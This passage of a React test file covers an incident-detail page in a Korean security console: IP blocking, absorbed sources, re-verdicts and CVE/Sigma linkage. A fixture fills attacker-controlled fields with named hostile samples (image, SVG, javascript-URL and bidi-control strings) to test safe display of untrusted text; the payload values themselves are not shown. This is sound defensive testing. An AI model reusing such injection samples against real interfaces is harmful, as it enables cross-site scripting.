    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    fireEvent.change(panel.getByLabelText('메모 (선택)'), { target: { value: '재시도용 메모' } })
    fireEvent.click(panel.getByRole('button', { name: '차단 확정' }))
    expect(await panel.findByText('조치를 기록하지 못했습니다')).toBeInTheDocument()
    expect(panel.getByRole('alert')).toHaveTextContent('차단 요청을 저장할 수 없습니다 (HTTP 503)')
    expect(panel.getByLabelText('메모 (선택)')).toHaveValue('재시도용 메모')
    expect(panel.getByText('아직 판정 · 조치 기록이 없습니다.')).toBeInTheDocument()
  })

  it('권한 밖(403) · 서버 오류(5xx)는 공통 상태 화면', async () => {
    stubApi({ body: { detail: '권한이 없습니다' }, status: 403 })
    const { unmount } = renderRoutes(routes(), PATH, noRetryClient())
    expect(await screen.findByRole('heading', { level: 1, name: '이 화면을 볼 권한이 없습니다' })).toBeInTheDocument()
    unmount()
    vi.unstubAllGlobals()

    stubApi({ body: { detail: '데이터베이스 연결 실패' }, status: 503 })
    renderRoutes(routes(), PATH, noRetryClient())
    expect(await screen.findByRole('heading', { level: 1, name: '데이터를 불러오지 못했습니다' })).toBeInTheDocument()
    expect(screen.getByText('데이터베이스 연결 실패 (HTTP 503)')).toBeInTheDocument()
    expect(screen.getByRole('button', { name: '다시 시도' })).toBeInTheDocument()
  })

  it('첫 사건이면 ③ 에 같은 페이로드 흡수 목록(출발지 · 첫 시각 · 세션 · 사유)을 보인다', async () => {
    stubApi({ body: detail({ rule_id: 'R006', rule_name: 'SSH 키 심기', absorbed: absorbed({ total: 250 }) }) })
    renderRoutes(routes(), PATH)
    const actor = await screen.findByRole('region', { name: '행위자 이력' })
    expect(within(actor).getByText('같은 페이로드 흡수 2곳')).toBeInTheDocument()
    expect(within(actor).getByText(/이 사건의 흡수 차단 3곳 유지 중/)).toHaveTextContent('같은 페이로드 흡수 2곳 · 기록 250건 · 이 사건의 흡수 차단 3곳 유지 중')
    // 기록 수에 억제 알림이 든다는 기준은 도움말에
    expect(within(actor).getByRole('button', { name: '같은 페이로드 흡수 설명' })).toHaveAccessibleDescription(/억제한 낮은 알림도 들어갑니다/)
    const table = within(actor).getByRole('table', { name: '같은 페이로드 흡수' })
    const rows = within(table).getAllByRole('row').slice(1)
    expect(rows).toHaveLength(3)
    expect(within(rows[1]).getByText('198.51.100.3')).toBeInTheDocument()
    expect(within(rows[1]).getByText('2')).toBeInTheDocument()
    expect(within(rows[0]).getByText(/같은 SSH 키를 24시간 안에/)).toBeInTheDocument()
    expect(within(rows[0]).getByTitle(KEY_FP)).toBeInTheDocument()
    expect(within(rows[2]).getByText(/억제/)).toBeInTheDocument()
    expect(within(actor).getByText('앞 3건만 보입니다 · 전체 250건')).toBeInTheDocument()
  })

  it('흡수 기록이 없는 사건은 흡수 목록 · 함께 차단 선택을 보이지 않는다', async () => {
    stubApi({ body: detail({ absorbed: { items: [], total: 0, sources: 0, blocked: 0 } }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    expect(screen.queryByRole('table', { name: '같은 페이로드 흡수' })).toBeNull()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    expect(panel.queryByRole('checkbox')).toBeNull()
  })

  it('차단 확인에서 흡수된 출발지를 함께 차단하도록 고를 수 있다(기본은 이 출발지만)', async () => {
    const fetch = stubApi({ body: detail({ absorbed: absorbed() }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    const confirm = within(panel.getByRole('form', { name: '차단 확인' }))
    const check = confirm.getByRole('checkbox', { name: '흡수된 출발지 2곳도 함께 차단' })
    expect(check).not.toBeChecked()
    fireEvent.click(check)
    fireEvent.click(confirm.getByRole('button', { name: '차단 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toBeDefined())
    expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ expected_version: '0:0', action: 'block_ip', expires_hours: 24, include_absorbed: true })
    expect(await panel.findByText(/흡수 출발지 2곳 함께 차단/)).toBeInTheDocument()

    // 다시 열면 선택은 꺼져 있다
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    expect(panel.getByRole('checkbox', { name: '흡수된 출발지 2곳도 함께 차단' })).not.toBeChecked()
  })

  it('흡수를 쓰는 규칙은 흡수 기록이 아직 없어도 함께 차단(후속 차단)을 고를 수 있고, 넣지 않을 곳을 미리 밝힌다', async () => {
    const fetch = stubApi({ body: detail({ rule_id: 'R006', absorbed: { items: [], total: 0, sources: 0, blocked: 0, absorbs: true, follow: null } }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    const confirm = within(panel.getByRole('form', { name: '차단 확인' }))
    fireEvent.click(confirm.getByRole('checkbox', { name: '앞으로 흡수되는 출발지도 함께 차단' }))
    fireEvent.click(confirm.getByRole('button', { name: '차단 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ expected_version: '0:0', action: 'block_ip', expires_hours: 24, include_absorbed: true }))
  })

  it('함께 차단 안내에 사람이 푼 곳 · 차단 금지 대역을 적고, 후속 차단 중이면 ③ 과 해제 확인에 보인다', async () => {
    const follow = { expires_at: '2026-09-19T07:00:00+00:00', requested_by: 'han' }
    stubApi({ role: 'admin', body: detail({ absorbed: absorbed({ skipped: ['198.51.100.9'], skipped_total: 1, unblockable: 2, follow }) }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    const actor = within(screen.getByRole('region', { name: '행위자 이력' }))
    expect(actor.getByText(/^후속 차단 중 · /)).toHaveTextContent('후속 차단 중 · 2026-09-19 16:00:00 까지')
    expect(actor.getByRole('button', { name: '같은 페이로드 흡수 설명' })).toHaveAccessibleDescription(/후속 차단: 첫 사건의 마지막 판정이 위협이면 새로 흡수되는 출발지도 2026-09-19 16:00:00 까지 차단합니다/)
    fireEvent.click(panel.getByRole('button', { name: '차단' }))
    const block = within(panel.getByRole('form', { name: '차단 확인' }))
    // 넣지 않을 곳은 본문, 함께 차단의 동작 규칙은 선택 옆 도움말
    expect(block.getByText(/사람이 푼 1곳\(198\.51\.100\.9\)은 다시 걸지 않습니다/)).toBeInTheDocument()
    expect(block.getByText(/차단 금지 대역\(사설 · 예약 · 인프라 주소\) 2곳은 넣지 않습니다/)).toBeInTheDocument()
    const rule = block.getByRole('button', { name: '흡수된 출발지 2곳도 함께 차단 설명' })
    expect(rule).toHaveAccessibleDescription(/같은 만료로 올리고, 만료 전까지 새로 흡수되는 출발지도/)
    expect(block.getByRole('checkbox', { name: '흡수된 출발지 2곳도 함께 차단' })).toHaveAccessibleDescription(/다시 걸지 않습니다.*같은 만료로 올리고/)
    fireEvent.click(panel.getByRole('button', { name: '취소' }))
    fireEvent.click(panel.getByRole('button', { name: '차단 해제' }))
    expect(within(panel.getByRole('form', { name: '차단 해제 확인' })).getByRole('checkbox', { name: '흡수 차단 3곳도 함께 해제 · 후속 차단 중지' })).toBeInTheDocument()
  })

  it('admin 해제 확인은 흡수 차단 함께 해제를 고를 수 있고 3곳 이상이면 R201 을 알린다', async () => {
    const fetch = stubApi({ role: 'admin', body: detail({ absorbed: absorbed() }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '차단 해제' }))
    const confirm = within(panel.getByRole('form', { name: '차단 해제 확인' }))
    expect(confirm.getByText('3곳 이상을 한꺼번에 풀면 차단 대량 해제(R201) 알림이 뜹니다.')).toBeInTheDocument()
    expect(confirm.getByRole('button', { name: '흡수 차단 3곳도 함께 해제 설명' })).toHaveAccessibleDescription(/의도된 감사입니다. 흡수 판단 전체가 틀렸을 때만 쓰고/)
    fireEvent.click(confirm.getByRole('checkbox', { name: '흡수 차단 3곳도 함께 해제' }))
    fireEvent.click(confirm.getByRole('button', { name: '차단 해제 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ expected_version: '0:0', action: 'unblock_ip', include_absorbed: true }))
    expect(await panel.findByText(/흡수 차단 3곳 함께 해제/)).toBeInTheDocument()
  })

  it('이 출발지 차단이 풀렸어도 흡수 차단이 살아 있으면 흡수 차단만 풀 수 있다', async () => {
    const released = { reason: 'console', method: 'nft', created_at: '2026-09-18T07:00:00+00:00', expires_at: '2999-01-01T00:00:00+00:00', released_at: '2026-09-18T09:00:00+00:00', enforced_at: '2026-09-18T07:00:10+00:00' }
    const fetch = stubApi({ role: 'admin', body: detail({ absorbed: absorbed({ blocked: 2 }), actor: { ...detail().actor, blocked: released } }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    const release = panel.getByRole('button', { name: '차단 해제' })
    expect(release).not.toHaveAttribute('aria-disabled')
    fireEvent.click(release)
    const confirm = within(panel.getByRole('form', { name: '차단 해제 확인' }))
    expect(confirm.getByText(/흡수 차단/, { selector: 'p' })).toHaveTextContent('이 사건의 흡수 차단 2곳만 지금 풉니다')
    const check = confirm.getByRole('checkbox', { name: '흡수 차단 2곳도 함께 해제' })
    expect(check).toBeChecked()
    expect(check).toBeDisabled()
    expect(confirm.queryByText(/R201/)).toBeNull()
    expect(confirm.getByRole('button', { name: '흡수 차단 2곳도 함께 해제 설명' })).toHaveAccessibleDescription('흡수 판단 전체가 틀렸을 때만 씁니다. 평소에는 만료로 풀리게 둡니다.')
    fireEvent.click(confirm.getByRole('button', { name: '차단 해제 확정' }))
    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/actions`, 'POST')).toEqual({ expected_version: '0:0', action: 'unblock_ip', include_absorbed: true }))
  })

  it('출발지가 없는 사건(대상만)은 행위 · 이력을 모을 수 없다고 알리고 차단은 흐리다', async () => {
    stubApi({ body: detail({ actor_ip: null, target: 'user:han', rule_id: 'R201', rule_name: '콘솔 차단 조작', severity: 'low', behavior: [], raw: [], related: [], actor: { history: null, rules: [], blocked: null }, circular: null }) })
    renderRoutes(routes(), PATH)
    expect(await screen.findByRole('heading', { level: 1, name: 'R201 콘솔 차단 조작' })).toBeInTheDocument()
    expect(screen.getByText('user:han')).toBeInTheDocument()
    expect(screen.getByText('발생원 관제 자기 탐지')).toBeInTheDocument()
    // 관제 자기 탐지 건은 심각도와 관계없이 critical 목표(1시간)
    expect(screen.getByText(/판정 목표 1시간/)).toBeInTheDocument()
    expect(within(screen.getByRole('region', { name: '규칙이 보지 않은 증거' })).getByText('출발지가 없어 같은 출발지의 행위를 모을 수 없습니다.')).toBeInTheDocument()
    expect(within(screen.getByRole('region', { name: '행위자 이력' })).getByText('출발지가 없는 사건입니다.')).toBeInTheDocument()
    expect(screen.getByRole('button', { name: '발생원 관제 자기 탐지 설명' })).toHaveAccessibleDescription(/침해사고 신고 기한이 걸려 critical 목표를 따릅니다/)
    expect(screen.queryByText('순환 규칙')).toBeNull()
    const block = await within(screen.getByRole('region', { name: '조치와 판정' })).findByRole('button', { name: '차단' })
    expect(block).toHaveAttribute('title', '출발지가 없는 사건은 차단할 수 없습니다')
  })
})

describe('IncidentDetailPage · 종결 사건 재판정(#94)', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
    vi.restoreAllMocks()
  })

  /** 발생 06:00 → 첫 판정 06:30(30분). 위협으로 종결된 사건 */
  const FIRST = { id: 1, verdict: 'threat', reason: '파일 투하', observed_value: 3, operator: 'han', proposed: null, decision_seconds: 40, created_at: '2026-09-18T06:30:00+00:00' } as const
  const clock = () => screen.getByText(/^발생 → 판정 /)

  it('최신 판정이 미결이 아니면 폼을 접고 재판정으로 편다. decision_seconds 는 편 때가 아니라 화면을 연 때부터다', async () => {
    const opened = Date.parse('2026-10-02T09:00:00Z')
    const now = vi.spyOn(Date, 'now').mockReturnValue(opened)
    const fetch = stubApi({ body: detail({ status: 'resolved', verdicts: [FIRST] }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()

    // 접힘: 현재 판정 · 이력은 보이고 판정값 · 기록 단추는 없다
    expect(panel.getByRole('heading', { name: '판정' })).toBeInTheDocument()
    const toggle = panel.getByRole('button', { name: '재판정' })
    expect(toggle).toHaveAttribute('aria-expanded', 'false')
    expect(panel.queryByRole('radio')).toBeNull()
    expect(panel.queryByRole('button', { name: '재판정 기록' })).toBeNull()
    expect(panel.getByRole('table', { name: '판정 · 조치 이력' })).toBeInTheDocument()

    // 1분 30초 뒤에 펴고, 2분 5초에 기록한다
    now.mockReturnValue(opened + 90_000)
    fireEvent.click(toggle)
    expect(panel.getByRole('button', { name: '접기' })).toHaveAttribute('aria-expanded', 'true')
    expect(panel.getByRole('heading', { name: '재판정' })).toBeInTheDocument()
    fireEvent.click(panel.getByRole('radio', { name: /^오탐/ }))
    now.mockReturnValue(opened + 125_000)
    fireEvent.click(panel.getByRole('button', { name: '재판정 기록' }))

    await waitFor(() => expect(sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')).toBeDefined())
    expect(sentBody(fetch, `${incidentPath(KEY)}/verdict`, 'POST')).toMatchObject({ verdict: 'false_positive', decision_seconds: 125 })

    // 기록하면 다시 접히고 결과 띠는 남는다. 시계는 첫 판정(30분)에서 멈춘 채다
    expect(await panel.findByText('판정을 기록했습니다')).toBeInTheDocument()
    expect(panel.getByRole('button', { name: '재판정' })).toHaveAttribute('aria-expanded', 'false')
    expect(panel.queryByRole('radio')).toBeNull()
    expect(clock()).toHaveTextContent('발생 → 판정 30분')
  })

  it('펼친 폼은 접기로 다시 접는다', async () => {
    stubApi({ body: detail({ status: 'resolved', verdicts: [FIRST] }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    fireEvent.click(panel.getByRole('button', { name: '재판정' }))
    expect(panel.getAllByRole('radio')).toHaveLength(5)
    fireEvent.click(panel.getByRole('button', { name: '접기' }))
    expect(panel.queryByRole('radio')).toBeNull()
    expect(panel.getByRole('button', { name: '재판정' })).toHaveAttribute('aria-expanded', 'false')
  })

  it('최신 판정이 미결이면 지금처럼 펼친다', async () => {
    stubApi({ body: detail({ status: 'resolved', verdicts: [{ ...FIRST, verdict: 'undetermined' }] }) })
    renderRoutes(routes(), PATH)
    const { panel } = await readyPanel()
    expect(panel.getByRole('heading', { name: '재판정' })).toBeInTheDocument()
    expect(panel.getByRole('button', { name: '재판정 기록' })).toBeInTheDocument()
    expect(panel.queryByRole('button', { name: '재판정' })).toBeNull()
  })

  it('상세 시계는 발생 → 첫 판정이다. 재판정이 있어도 늘지 않고 목표 색도 첫 판정 기준이다', async () => {
    // 첫 판정 30분(critical 목표 1시간 이내) · 최근 판정 3시간(초과)
    const latest = { ...FIRST, id: 2, verdict: 'false_positive', created_at: '2026-09-18T09:00:00+00:00' } as const
    stubApi({ body: detail({ status: 'resolved', verdicts: [FIRST, latest] }) })
    renderRoutes(routes(), PATH)
    await readyPanel()
    expect(clock()).toHaveTextContent('발생 → 판정 30분')
    expect(clock().closest('[data-elapsed-tone]')).toHaveAttribute('data-elapsed-tone', 'ok')
    // 머리 배지는 그대로 최근 판정이다
    expect(screen.getByTitle('최근 판정')).toHaveAttribute('data-verdict', 'false_positive')
  })
})

describe('IncidentDetailPage · ⑥ 취약점 연계', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
  })

  it('서명 규칙 사건이면 제품 · 대응 방식 · 자산 적용 판정 · KEV · CVSS · EPSS · 신선도를 보인다', async () => {
    stubApi({ cti: ctiFor() })
    renderRoutes(routes(), PATH)
    const region = await screen.findByRole('region', { name: '취약점 연계' })
    const panel = within(region)
    expect(panel.getByText('CVE 정보는 조사 우선순위 참고용입니다. 판정은 행위 증거로 합니다.')).toBeInTheDocument()
    expect(panel.getByText('규칙 R105 c1 · 서명 1개 · CVE 1건')).toBeInTheDocument()
    expect(panel.queryByText(/공개 정보가 오래됐습니다/)).toBeNull()

    // 서명: 제품 · 공급사 · 대응 방식 · 적용 요약
    const block = region.querySelector('[data-signature="geoserver"]') as HTMLElement
    expect(within(block).getByText('GeoServer')).toBeInTheDocument()
    expect(within(block).getByText('OSGeo')).toBeInTheDocument()
    expect(within(block).getByText('분석가 대응')).toBeInTheDocument()
    expect(within(block).getByText('KEV 에 이 제품 항목 1건')).toBeInTheDocument()
    // 분석가 대응의 근거 문장은 대응 방식 표지 옆 도움말에
    const basis = within(block).getByRole('button', { name: 'GeoServer 대응 근거 설명' })
    expect(basis).toHaveAccessibleDescription('GeoServer 기본 배포의 웹 관리 화면이 /geoserver/web/ 아래에 있다.')
    expect(block).toContainElement(tipPanel(basis))

    // 자산 적용: 디코이 → 비해당(모의 서비스), 오래된 자산 → 미확인
    const rows = within(panel.getByRole('table', { name: 'GeoServer 자산 적용' })).getAllByRole('row').slice(1)
    expect(rows).toHaveLength(3)
    expect(within(rows[0]).getByText('web-decoy')).toBeInTheDocument()
    expect(within(rows[0]).getByText('받음')).toBeInTheDocument()
    expect(within(rows[0]).getByText('비해당')).toBeInTheDocument()
    expect(within(rows[0]).getByText(/모의 서비스다/)).toBeInTheDocument()
    expect(within(rows[2]).getByText('미확인')).toBeInTheDocument()
    expect(within(rows[2]).getByText(/비해당으로 보지 않는다/)).toBeInTheDocument()

    // CVE 표
    const cveRow = within(panel.getByRole('table', { name: '이어진 CVE' })).getAllByRole('row')[1]
    expect(within(cveRow).getByText('CVE-2024-36401')).toBeInTheDocument()
    expect(within(cveRow).getByText('KEV')).toBeInTheDocument()
    expect(within(cveRow).getByText('2024-07-15')).toBeInTheDocument()
    expect(within(cveRow).getByText('사용 확인')).toBeInTheDocument()
    expect(within(cveRow).getByText('9.8 CRITICAL')).toBeInTheDocument()
    expect(within(cveRow).getByText(/94\.4%/)).toBeInTheDocument()
    expect(within(cveRow).getByText('(백분위 99.9)')).toBeInTheDocument()

    // 신선도(KST)는 구역 끝에 접혀 있고 펼치면 보인다
    const fresh = panel.getByRole('button', { name: '취약점 연계 공개 정보 신선도' })
    expect(fresh).toHaveAttribute('aria-expanded', 'false')
    const facts = tipPanel(fresh)
    expect(facts).toContainElement(panel.getByText('KEV 수집'))
    expect(within(facts).getByText('2026-09-25 11:00')).toBeInTheDocument()
    expect(within(facts).getByText('배포판 대조')).toBeInTheDocument()
    fireEvent.click(fresh)
    expect(fresh).toHaveAttribute('aria-expanded', 'true')
    expect(panel.getByRole('link', { name: '자산 · 취약점' })).toHaveAttribute('href', '/inventory')
    expect(region).not.toHaveTextContent('자산별 설치 패키지')

    // 머리글의 심각도 표기(소문자)는 여전히 하나뿐이다
    expect(screen.getByText('critical')).toHaveAttribute('data-severity', 'critical')
  })

  it('머리에 목록 · 대상 카드와 같은 CVE 배지(서버 badge)를 보이고, 배지가 없는 이전 서버는 그리지 않는다(#52)', async () => {
    const badge = { cves: 1, kev: 1, applicability: 'not_affected', stale: false } as const
    stubApi({ cti: ctiFor({ badge }) })
    const first = renderRoutes(routes(), PATH)
    const region = await screen.findByRole('region', { name: '취약점 연계' })
    const shown = within(region).getByText(ctiBadgeText(badge))
    expect(shown).toHaveTextContent('CVE 1 · KEV 1')
    expect(shown).toHaveAttribute('data-cti-badge')
    first.unmount()
    vi.unstubAllGlobals()

    stubApi({ cti: ctiFor() })
    renderRoutes(routes(), PATH)
    const old = await screen.findByRole('region', { name: '취약점 연계' })
    expect(within(old).getByText('규칙 R105 c1 · 서명 1개 · CVE 1건')).toBeInTheDocument()
    expect(old.querySelector('[data-cti-badge]')).toBeNull()
  })

  it('R106 처럼 서명이 여럿이고 KEV 가 아닌 CVE 는 등재일 · 랜섬웨어 칸을 비우고 부른 서명을 적는다', async () => {
    const cti = ctiFor({
      rule_id: 'R106',
      signatures: [
        signature({ id: 'apache-path-traversal', product: 'Apache HTTP Server', vendor: 'Apache', cves: ['CVE-2021-41773'], kev_products: null, summary: 'affected', applicability: [] }),
        signature({ id: 'hikvision-weblanguage', product: 'Hikvision 카메라 웹 서버', vendor: 'Hikvision', mapping: 'explicit', methods: ['PUT'], cves: ['CVE-2021-36260'], kev_products: null }),
      ],
      cves: [cve({ cve_id: 'CVE-2021-41773', signature_ids: ['apache-path-traversal'], kev: null, cvss: null, epss: null, description: null })],
    })
    stubApi({ cti })
    renderRoutes(routes(), PATH)
    const panel = within(await screen.findByRole('region', { name: '취약점 연계' }))
    expect(panel.getByText('명시 대응')).toBeInTheDocument()
    expect(panel.getByText('hikvision-weblanguage · PUT 만')).toBeInTheDocument()
    expect(panel.getByText('해당')).toBeInTheDocument()
    expect(panel.getByText(/자산 표가 비어 있어 적용 여부를 판정하지 못했습니다/)).toBeInTheDocument()
    const row = within(panel.getByRole('table', { name: '이어진 CVE' })).getAllByRole('row')[1]
    expect(within(row).getByText('apache-path-traversal')).toBeInTheDocument()
    expect(within(row).queryByText('KEV')).toBeNull()
    expect(within(row).getAllByText('—').length).toBeGreaterThanOrEqual(4)
  })

  it('공개 규칙(Sigma) 서명은 대응 방식 · 응답 코드 조건 · 원본 규칙 출처 · 변환 메모를 보이고 원본 위치는 새 창 링크다(#54)', async () => {
    const sig = sigmaSignature()
    stubApi({ cti: ctiFor({ rule_id: 'R107', rule_version: 'sg1', signatures: [sig], cves: [cve({ cve_id: 'CVE-2021-41773', signature_ids: [sig.id], kev: null })] }) })
    renderRoutes(routes(), PATH)
    const region = await screen.findByRole('region', { name: '취약점 연계' })
    expect(within(region).getByText('규칙 R107 sg1 · 서명 1개 · CVE 1건')).toBeInTheDocument()
    const block = region.querySelector(`[data-signature="${sig.id}"]`) as HTMLElement
    const mapping = within(block).getByText('Sigma 규칙')
    expect(mapping).toHaveAttribute('data-mapping', 'sigma')
    expect(mapping.className).toContain('text-violet')
    expect(within(block).getByText('응답 코드 200 · 301 일 때만')).toBeInTheDocument()
    // 공개 규칙의 근거 문장은 아래 원본 규칙 출처와 같은 말이라 그리지 않는다
    expect(within(block).queryByText(/DRL 1\.1 로 배포된 것을 변환했다/)).toBeNull()
    expect(within(block).queryByRole('button', { name: /대응 근거 설명$/ })).toBeNull()

    const source = block.querySelector('[data-sigma-source]') as HTMLElement
    expect(source).toHaveTextContent('원본 규칙: CVE-2021-41773 Exploitation Attempt · 3007fec6-e761-4319-91af-e32e20ac43f5')
    // 작성 · 위치 · 변환 메모는 '출처 보기' 로 접혀 있다
    const more = within(source).getByRole('button', { name: '원본 규칙 출처 보기' })
    expect(more).toHaveAttribute('aria-expanded', 'false')
    expect(tipPanel(more)).toHaveTextContent('작성 daffainfo, Florian Roth')
    expect(source).toHaveTextContent('작성 daffainfo, Florian Roth · 성숙도 test · 등급 high · 라이선스 DRL-1.1')
    const link = within(source).getByRole('link', { name: SIGMA_URL })
    expect(link).toHaveAttribute('href', SIGMA_URL)
    expect(link).toHaveAttribute('target', '_blank')
    expect(link).toHaveAttribute('rel', 'noopener noreferrer')
    const notes = within(within(source).getByRole('list', { name: '변환 메모' })).getAllByRole('listitem')
    expect(notes.map((li) => li.textContent)).toEqual(sigmaSource().notes)
    // 자산 적용 표는 다른 서명과 같이 그린다
    expect(within(region).getByRole('table', { name: 'Apache HTTP Server 자산 적용' })).toBeInTheDocument()
  })

  it('c1 서명 · 이전 서버(칸 없음)는 응답 코드 조건과 원본 규칙 출처를 그리지 않고, 메모가 없으면 목록을 두지 않는다(#54)', async () => {
    const cti = ctiFor({
      signatures: [
        signature({ statuses: null, sigma: null }),
        signature({ id: 'phpunit-eval-stdin', product: 'PHPUnit', mapping: 'explicit' }),
        sigmaSignature({ statuses: [], sigma: sigmaSource({ notes: [], url: null, author: null }) }),
      ],
    })
    stubApi({ cti })
    renderRoutes(routes(), PATH)
    const region = await screen.findByRole('region', { name: '취약점 연계' })
    expect(region.querySelectorAll('[data-statuses]')).toHaveLength(0)
    expect(region.querySelectorAll('[data-sigma-source]')).toHaveLength(1)
    expect(within(region).getByText('분석가 대응').className).toContain('text-muted')
    expect(within(region).getByText('명시 대응').className).toContain('text-primary')
    const source = region.querySelector('[data-sigma-source]') as HTMLElement
    expect(within(source).queryByRole('list')).toBeNull()
    expect(within(source).queryByRole('link')).toBeNull()
    expect(source).toHaveTextContent('작성 — ·')
    expect(source).toHaveTextContent('원본 위치 —')
  })

  it('서명 규칙 사건이 아니면(applicable=false) 구역을 그리지 않는다', async () => {
    stubApi()
    const client = noRetryClient()
    renderRoutes(routes(), PATH, client)
    expect(await screen.findByRole('heading', { level: 1, name: 'R003 악성코드 투하' })).toBeInTheDocument()
    await waitFor(() => expect(client.getQueryState(ctiKeys.incident(KEY))?.status).toBe('success'))
    expect(screen.queryByRole('region', { name: '취약점 연계' })).toBeNull()
  })

  it('/cti 가 404 면 구역 안에 안내 한 줄만 보이고 나머지 구역은 그대로다', async () => {
    stubApi({ cti: { detail: '인시던트를 찾을 수 없습니다' }, ctiStatus: 404 })
    renderRoutes(routes(), PATH, noRetryClient())
    const region = await screen.findByRole('region', { name: '취약점 연계' })
    expect(within(region).getByText('취약점 연계 정보가 없습니다. 콘솔 API 가 이 기능 이전 판일 수 있습니다.')).toBeInTheDocument()
    expect(within(region).queryByRole('alert')).toBeNull()
    expect(screen.getByRole('heading', { level: 1, name: 'R003 악성코드 투하' })).toBeInTheDocument()
    expect(screen.getByRole('region', { name: '조치와 판정' })).toBeInTheDocument()
  })

  it('/cti 가 503 이면 구역 안에서 오류와 다시 시도를 보이고, 상세는 그대로다', async () => {
    const fetch = stubApi({ cti: { detail: 'CTI 조회 실패' }, ctiStatus: 503 })
    renderRoutes(routes(), PATH, noRetryClient())
    const region = await screen.findByRole('region', { name: '취약점 연계' })
    const panel = within(region)
    expect(panel.getByRole('alert')).toHaveTextContent('데이터를 불러오지 못했습니다')
    expect(panel.getByText('CTI 조회 실패 (HTTP 503)')).toBeInTheDocument()
    expect(screen.getByRole('heading', { level: 1, name: 'R003 악성코드 투하' })).toBeInTheDocument()
    expect(screen.getByRole('region', { name: '규칙이 본 것' })).toBeInTheDocument()

    const ctiCalls = () => fetch.mock.calls.filter(([input]) => input === incidentCtiPath(KEY)).length
    const before = ctiCalls()
    fireEvent.click(panel.getByRole('button', { name: '다시 시도' }))
    await waitFor(() => expect(ctiCalls()).toBeGreaterThan(before))
  })

  it('공개 정보가 오래되면 비해당으로 읽지 말라는 띠와 오래됨 표지를 보인다', async () => {
    const f = freshness()
    stubApi({ cti: ctiFor({ stale: true, freshness: { ...f, kev: { ...f.kev, stale: true }, assets: { ...f.assets, stale_assets: ['fw'] } } }) })
    renderRoutes(routes(), PATH)
    const panel = within(await screen.findByRole('region', { name: '취약점 연계' }))
    // 신선도는 접혀 있으므로 어느 출처가 오래됐는지는 띠가 본문에서 알린다
    expect(panel.getByText(/공개 정보가 오래됐습니다\. 비해당으로 읽지 않습니다\./)).toHaveTextContent('오래된 출처: KEV')
    const facts = tipPanel(panel.getByRole('button', { name: '취약점 연계 공개 정보 신선도' }))
    expect(within(facts).getAllByText('오래됨')).toHaveLength(2)
    expect(within(facts).getByText('오래됨 · fw')).toBeInTheDocument()
  })

  it('서명 규칙 사건인데 CTI 표가 없으면(available=false) 적용 안내를 보인다', async () => {
    stubApi({ cti: { as_of: '2026-09-18T08:00:00Z', incident_key: KEY, applicable: true, available: false } })
    renderRoutes(routes(), PATH)
    const region = await screen.findByRole('region', { name: '취약점 연계' })
    expect(within(region).getByText('공개 취약점 정보 표가 아직 없습니다. 관리자에게 수집 상태를 확인해 주세요.')).toBeInTheDocument()
  })
})

// ---------------------------------------------------------------- #41 비신뢰 문자열 표시

/** 공격자 값이 닿는 자리마다 악성 표본을 넣은 사건(원문 · 행위 · 표본 키와 값 · 세션 · 대상 · 차단 · 흡수 · 이력 · 제안 근거) */
function hostileDetail(): IncidentDetail {
  const line = { ts: '2026-09-18T06:00:30+00:00', sensor: MIXED, eventid: 'cowrie.command.input', session: MIXED, username: HOSTILE.rlo, input: MIXED, url: `/x?q=${HOSTILE.img}`, shasum: HOSTILE.zwsp, http_method: HOSTILE.svg, http_status: 200 }
  const base = detail()
  return detail({
    target: `user:${MIXED}`,
    evidence: {
      sample: [{ ts: '2026-09-18T06:00:00+00:00', url: MIXED, [HOSTILE.rlo]: HOSTILE.jsUrl, [HOSTILE.img]: LONG, session: MIXED }, MIXED],
      sessions: [MIXED, LONG],
      observed_count_max: 3,
    },
    behavior: [line, { ...line, input: LONG }],
    raw: [
      { ...line, has_password: true, user_agent: MIXED, message: HOSTILE.decoy },
      { ...line, input: null, has_password: false, user_agent: null, message: LONG },
    ],
    actor: {
      ...base.actor,
      history: { first_seen: '2026-09-10T00:00:00+00:00', last_seen: '2026-09-18T06:10:00+00:00', events: 1, sensors: [MIXED], sessions: 1 },
      blocked: { reason: MIXED, method: HOSTILE.style, created_at: '2026-09-18T07:00:00+00:00', expires_at: '2999-01-01T00:00:00+00:00', released_at: null, enforced_at: null },
    },
    absorbed: absorbed({ items: [{ ...absorbed().items[0], reason: MIXED, payload: `${HOSTILE.rlo}${HOSTILE.img}` }], total: 1, sources: 1 }),
    verdicts: [{ id: 1, verdict: 'threat', reason: MIXED, observed_value: null, operator: HOSTILE.rlo, created_at: '2026-09-18T07:00:00+00:00', proposed: null, decision_seconds: null }],
    actions: [{ id: 2, action: 'block_ip', operator: HOSTILE.zwsp, note: LONG, created_at: '2026-09-18T07:00:00+00:00' }],
    proposal: { verdict: 'threat', reasons: [MIXED] },
  })
}

function hostileCti() {
  return ctiFor({
    signatures: [signature({ product: MIXED, vendor: HOSTILE.rlo, source: LONG, applicability: [applicability({ reason: MIXED })] })],
    cves: [cve({ kev: null, description: MIXED })],
  })
}

describe('IncidentDetailPage · 차단 집행(#47)', () => {
  afterEach(() => {
    vi.unstubAllGlobals()
  })

  const base = detail().actor.blocked!

